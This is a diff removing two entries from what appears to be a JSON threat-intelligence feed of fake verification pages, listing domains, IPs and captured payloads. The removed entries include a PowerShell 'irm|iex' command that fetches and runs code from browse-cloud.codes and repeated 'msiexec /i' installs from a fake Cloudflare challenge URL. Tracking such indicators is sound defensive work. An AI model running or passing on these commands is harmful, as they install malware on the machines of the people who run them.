@@ -7299,55 +7299,5 @@
     ],
     "ReportId": "cmwibrmxl0zoa0omlbyzngmgj",
     "ScannedAt": "2026-11-15T21:06:41.001000+00:00"
-  },
-  {
-    "UrlDomain": "saluteopinioni.it",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "46.202.172.183"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/ec20c619766c98f4",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/ec20c619766c98f4'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/ec20c619766c98f4"
-    ],
-    "ReportId": "cmwia30sw0zni0omlamzgx2of",
-    "ScannedAt": "2026-11-15T20:19:32.973000+00:00"
-  },
-  {
-    "UrlDomain": "ynq.adg.mybluehost.me",
-    "DeliveryUrl": [
-      "shift-art.com"
-    ],
-    "PayloadUrl": [
-      "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/"
-    ],
-    "IP": [
-      "162.241.219.74"
-    ],
-    "Related": [
-      {
-        "Value": "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/custo",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiex...\n...ps://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ Verif...\nFake",
-    "ResolvedDownloadUrl": [
-      "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/"
-    ],
-    "ReportId": "cmwi9zysw0zmv0omltdaab4by",
-    "ScannedAt": "2026-11-15T20:17:10.453000+00:00"
   }
 ]
